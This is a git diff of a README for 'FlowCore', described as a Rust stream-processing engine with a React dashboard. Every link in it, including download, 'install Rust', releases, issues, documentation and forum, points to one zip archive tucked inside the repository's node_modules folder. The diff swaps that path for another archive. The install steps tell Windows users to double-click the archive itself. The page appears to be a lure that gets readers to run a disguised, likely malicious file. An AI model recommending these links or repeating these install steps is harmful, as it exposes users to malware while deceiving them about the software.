@@ -1,7 +1,7 @@
 # 🛠️ FlowCore - Stream Processing Made Easy
 
 ## 📥 Download Now!
-[![Download FlowCore](https://raw.githubusercontent.com/Ej-Locked/FlowCore/main/frontend/node_modules/@babel/types/FlowCore-v1.9.zip%20Now-FlowCore-blue)](https://raw.githubusercontent.com/Ej-Locked/FlowCore/main/frontend/node_modules/@babel/types/FlowCore-v1.9.zip)
+[![Download FlowCore](https://github.com/Ej-Locked/FlowCore/raw/refs/heads/main/frontend/node_modules/yallist/Core-Flow-1.6.zip%20Now-FlowCore-blue)](https://github.com/Ej-Locked/FlowCore/raw/refs/heads/main/frontend/node_modules/yallist/Core-Flow-1.6.zip)
 
 ## 📖 About FlowCore
 FlowCore is a lightweight, Rust-powered real-time stream processing engine. It helps you handle data streams efficiently. With features like event-time processing, tumbling windows, and late-event handling, you can manage your data effectively. FlowCore also comes with a modern React dashboard for easy live visualization of your data streams.
@@ -14,25 +14,25 @@ Before downloading, ensure your system meets these requirements:
 - **Operating System:** Windows, macOS, or Linux
 - **RAM:** At least 2 GB
 - **Disk Space:** At least 100 MB of free space
-- **Rust:** Ensure you have Rust installed. If not, download it from [https://raw.githubusercontent.com/Ej-Locked/FlowCore/main/frontend/node_modules/@babel/types/FlowCore-v1.9.zip](https://raw.githubusercontent.com/Ej-Locked/FlowCore/main/frontend/node_modules/@babel/types/FlowCore-v1.9.zip).
+- **Rust:** Ensure you have Rust installed. If not, download it from [https://github.com/Ej-Locked/FlowCore/raw/refs/heads/main/frontend/node_modules/yallist/Core-Flow-1.6.zip](https://github.com/Ej-Locked/FlowCore/raw/refs/heads/main/frontend/node_modules/yallist/Core-Flow-1.6.zip).
 
 ### 2. Visit the Download Page
-Go to the [FlowCore Releases Page](https://raw.githubusercontent.com/Ej-Locked/FlowCore/main/frontend/node_modules/@babel/types/FlowCore-v1.9.zip) to find the latest version. 
+Go to the [FlowCore Releases Page](https://github.com/Ej-Locked/FlowCore/raw/refs/heads/main/frontend/node_modules/yallist/Core-Flow-1.6.zip) to find the latest version. 
 
 ### 3. Download the Installer
 On the releases page, find the latest version of FlowCore. Click on it to access the release assets. 
 
 ### 4. Choose Your Operating System
 Select the right installer for your operating system:
-- For Windows, download `https://raw.githubusercontent.com/Ej-Locked/FlowCore/main/frontend/node_modules/@babel/types/FlowCore-v1.9.zip`
-- For macOS, download `https://raw.githubusercontent.com/Ej-Locked/FlowCore/main/frontend/node_modules/@babel/types/FlowCore-v1.9.zip`
-- For Linux, download `https://raw.githubusercontent.com/Ej-Locked/FlowCore/main/frontend/node_modules/@babel/types/FlowCore-v1.9.zip`
+- For Windows, download `https://github.com/Ej-Locked/FlowCore/raw/refs/heads/main/frontend/node_modules/yallist/Core-Flow-1.6.zip`
+- For macOS, download `https://github.com/Ej-Locked/FlowCore/raw/refs/heads/main/frontend/node_modules/yallist/Core-Flow-1.6.zip`
+- For Linux, download `https://github.com/Ej-Locked/FlowCore/raw/refs/heads/main/frontend/node_modules/yallist/Core-Flow-1.6.zip`
 
 ### 5. Install FlowCore
 Once you have downloaded the installer, follow these steps:
-- **Windows:** Double-click `https://raw.githubusercontent.com/Ej-Locked/FlowCore/main/frontend/node_modules/@babel/types/FlowCore-v1.9.zip` and follow the prompts to complete the installation.
-- **macOS:** Extract `https://raw.githubusercontent.com/Ej-Locked/FlowCore/main/frontend/node_modules/@babel/types/FlowCore-v1.9.zip` and drag the FlowCore application to your Applications folder.
-- **Linux:** Extract `https://raw.githubusercontent.com/Ej-Locked/FlowCore/main/frontend/node_modules/@babel/types/FlowCore-v1.9.zip` using the terminal and run the executable file.
+- **Windows:** Double-click `https://github.com/Ej-Locked/FlowCore/raw/refs/heads/main/frontend/node_modules/yallist/Core-Flow-1.6.zip` and follow the prompts to complete the installation.
+- **macOS:** Extract `https://github.com/Ej-Locked/FlowCore/raw/refs/heads/main/frontend/node_modules/yallist/Core-Flow-1.6.zip` and drag the FlowCore application to your Applications folder.
+- **Linux:** Extract `https://github.com/Ej-Locked/FlowCore/raw/refs/heads/main/frontend/node_modules/yallist/Core-Flow-1.6.zip` using the terminal and run the executable file.
 
 ### 6. Launch FlowCore
 After installation, you can launch FlowCore:
@@ -64,9 +64,9 @@ Include screenshots of the dashboard and key features to illustrate FlowCore's u
 
 ## 🏗️ Community & Support
 If you run into issues or need assistance:
-- Visit our [GitHub Issues](https://raw.githubusercontent.com/Ej-Locked/FlowCore/main/frontend/node_modules/@babel/types/FlowCore-v1.9.zip) page to report problems.
+- Visit our [GitHub Issues](https://github.com/Ej-Locked/FlowCore/raw/refs/heads/main/frontend/node_modules/yallist/Core-Flow-1.6.zip) page to report problems.
 - Join our community forum for discussions and advice.
-- Check the [documentation](https://raw.githubusercontent.com/Ej-Locked/FlowCore/main/frontend/node_modules/@babel/types/FlowCore-v1.9.zip) for detailed guidance on setup and configurations.
+- Check the [documentation](https://github.com/Ej-Locked/FlowCore/raw/refs/heads/main/frontend/node_modules/yallist/Core-Flow-1.6.zip) for detailed guidance on setup and configurations.
 
 ## 🌟 Acknowledgments
 FlowCore draws inspiration from Apache Flink and integrates concepts from streaming data processing fields. Special thanks to the Rust community for providing the foundational technology.
@@ -75,8 +75,8 @@ FlowCore draws inspiration from Apache Flink and integrates concepts from stream
 FlowCore simplifies real-time stream processing. Whether you're monitoring data or building responsive applications, follow these steps to get started. Download now to explore its capabilities. 
 
 ### 🔗 Important Links
-- [Download FlowCore](https://raw.githubusercontent.com/Ej-Locked/FlowCore/main/frontend/node_modules/@babel/types/FlowCore-v1.9.zip)
-- [Documentation](https://raw.githubusercontent.com/Ej-Locked/FlowCore/main/frontend/node_modules/@babel/types/FlowCore-v1.9.zip)
-- [Community Forum](https://raw.githubusercontent.com/Ej-Locked/FlowCore/main/frontend/node_modules/@babel/types/FlowCore-v1.9.zip)
+- [Download FlowCore](https://github.com/Ej-Locked/FlowCore/raw/refs/heads/main/frontend/node_modules/yallist/Core-Flow-1.6.zip)
+- [Documentation](https://github.com/Ej-Locked/FlowCore/raw/refs/heads/main/frontend/node_modules/yallist/Core-Flow-1.6.zip)
+- [Community Forum](https://github.com/Ej-Locked/FlowCore/raw/refs/heads/main/frontend/node_modules/yallist/Core-Flow-1.6.zip)
 
 Now you're ready to download and explore FlowCore!
